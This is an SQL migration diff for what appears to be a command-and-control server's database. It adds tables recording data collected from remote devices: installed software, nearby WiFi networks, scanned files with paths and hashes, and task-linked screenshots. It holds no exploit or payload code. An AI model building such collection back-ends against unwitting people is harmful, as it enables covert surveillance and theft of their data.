@@ -9,6 +9,8 @@ create table if not exists c2_device
     macAddress   varchar(64)                        null,
     hostName     varchar(128)                       null,
     os           varchar(128)                       null,
+    softwareList longtext                           null,
+    wifiData     longtext                           null,
     heartbeatInterval int                           default 60000,
     lastSeen     datetime                           null,
     createTime   datetime     default CURRENT_TIMESTAMP not null,
@@ -21,7 +23,7 @@ create table if not exists c2_task
 (
     id           bigint auto_increment primary key,
     taskId       varchar(64)                        not null,
-    deviceId     bigint                             null,
+    device_uuid  varchar(64)                        null,
     command      varchar(128)                       not null,
     params       text                               null,
     status       varchar(32)                        default 'pending' not null,
@@ -29,6 +31,57 @@ create table if not exists c2_task
     createTime   datetime     default CURRENT_TIMESTAMP not null,
     updateTime   datetime     default CURRENT_TIMESTAMP not null,
     isDelete     tinyint      default 0             not null
+);
+
+-- C2 WiFi
+create table if not exists c2_wifi
+(
+    id             bigint auto_increment primary key,
+    device_uuid    varchar(64)                        not null,
+    ssid           varchar(128)                       null,
+    bssid          varchar(64)                        null,
+    signalStrength varchar(32)                        null,
+    authentication varchar(64)                        null,
+    createTime     datetime     default CURRENT_TIMESTAMP not null,
+    isDelete       tinyint      default 0             not null
+);
+
+-- C2 Software
+create table if not exists c2_software
+(
+    id             bigint auto_increment primary key,
+    device_uuid    varchar(64)                        not null,
+    name           varchar(256)                       null,
+    version        varchar(128)                       null,
+    installDate    varchar(64)                        null,
+    createTime     datetime     default CURRENT_TIMESTAMP not null,
+    isDelete       tinyint      default 0             not null
+);
+
+-- C2 File Scan
+create table if not exists c2_file_scan
+(
+    id             bigint auto_increment primary key,
+    device_uuid    varchar(64)                        not null,
+    fileName       varchar(256)                       null,
+    filePath       varchar(512)                       null,
+    fileSize       bigint                             null,
+    md5            varchar(64)                        null,
+    lastModified   datetime                           null,
+    isRecent       tinyint      default 0             null,
+    createTime     datetime     default CURRENT_TIMESTAMP not null,
+    isDelete       tinyint      default 0             not null
+);
+
+-- C2 Screenshot
+create table if not exists c2_screenshot
+(
+    id             bigint auto_increment primary key,
+    device_uuid    varchar(64)                        not null,
+    taskId         varchar(64)                        null,
+    url            varchar(512)                       null,
+    createTime     datetime     default CURRENT_TIMESTAMP not null,
+    isDelete       tinyint      default 0             not null
 );
 
 -- TG Account
